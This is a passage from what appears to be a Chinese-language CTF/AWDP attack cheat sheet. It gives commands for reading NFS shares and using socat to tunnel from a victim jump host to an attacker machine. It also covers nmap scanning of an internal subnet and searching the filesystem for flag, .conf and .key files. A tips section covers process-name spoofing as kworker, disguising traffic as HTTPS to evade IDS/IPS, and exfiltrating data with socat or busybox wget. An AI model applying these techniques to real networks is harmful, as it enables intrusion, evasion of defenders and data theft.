./libnfs/nfs-ls -R nfs://10.0.0.100/ 2>/dev/null
./libnfs/nfs-cat nfs://10.0.0.100/flag

# 2) 用 socat 建立内网隧道
# 攻击机监听
./net/socat TCP-LISTEN:1080,fork,reuseaddr TCP:target_ip:1080
# 跳板机 (受害机) 转发
./net/socat TCP-LISTEN:1080,fork,reuseaddr SOCKS4:攻击机:内网目标:22,socksport=1080

# 3) 内网横向移动
./net/nmap -sS -sV -Pn 10.0.0.0/24 -oA /tmp/internal

# 4) 关键信息窃取
./busybox find / -name "flag*" -o -name "*.conf" -o -name "*.key" 2>/dev/null
```

---

## 提示与技巧

1. **批量探测**：利用 bash 循环配合 NFS/网络工具批量扫描 C 段
2. **分卷上传**：fscan 体积较大 (51MB)，可用 `busybox split` 分割后上传再合并
3. **隐蔽性**：socat + OpenSSL 加密通信可绕过大部分 IDS/IPS
4. **进程隐藏**：AWDP 中修改工具进程名避开对手排查（如 `exec -a [kworker/u:1] ./socat ...`）
5. **流量伪装**：socat 的 SSL 流量伪装成 HTTPS，配合常见端口 (443/8443) 难以被发现
6. **数据外传**：没有 curl/wget 时，用 `socat` 的 TCP CONNECT 或 `busybox wget` 传输数据
7. **快速回滚**：AWDP 中利用 inotify-tools 监控 + busybox cp 备份，发现篡改立即恢复
